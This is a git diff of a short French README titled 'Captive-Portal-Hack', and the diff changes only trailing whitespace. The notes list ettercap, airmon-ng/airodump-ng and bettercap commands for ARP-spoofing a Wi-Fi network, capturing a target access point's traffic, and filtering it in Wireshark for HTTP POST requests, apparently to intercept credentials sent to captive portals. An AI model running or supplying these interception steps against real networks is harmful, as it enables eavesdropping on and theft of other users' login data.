@@ -1,21 +1,21 @@
 # Captive-Portal-Hack
 Captive portal hacking
 
-**-->Arp Spoofing / MiTm**
+**-->Arp Spoofing / MiTm**  
 
-Outils: ettercap, bettercap, air... suite, wireshark ...
+Outils: ettercap, bettercap, air... suite, wireshark ...  
 
-Commandes utiles et steps:
+Commandes utiles et steps:  
 
-**Ettercap**
--$sudo ettercap -Tq -M arp:remote -i wlan0 ///
+**Ettercap**  
+-$sudo ettercap -Tq -M arp:remote -i wlan0 ///  
 
-**airmon-ng, airodump-ng, wireshark**
--$sudo airmon-ng check kill
--$sudo airmon-ng start wlan0
--$sudo airodump-ng wlan0
--$sudo airodump-ng --bssid <BSSID> -c <CH> -w nomFichierCapture wlan0
-Ensuite ouvrir le fichier de capture .cap dans wireshark et filtrer les traffics post (http.request.method==POST).
+**airmon-ng, airodump-ng, wireshark**  
+-$sudo airmon-ng check kill  
+-$sudo airmon-ng start wlan0  
+-$sudo airodump-ng wlan0  
+-$sudo airodump-ng --bssid <BSSID> -c <CH> -w nomFichierCapture wlan0  
+Ensuite ouvrir le fichier de capture .cap dans wireshark et filtrer les traffics post (http.request.method==POST).  
 
 **Bettercap**
 -$sudo bettercap -iface wlan0 
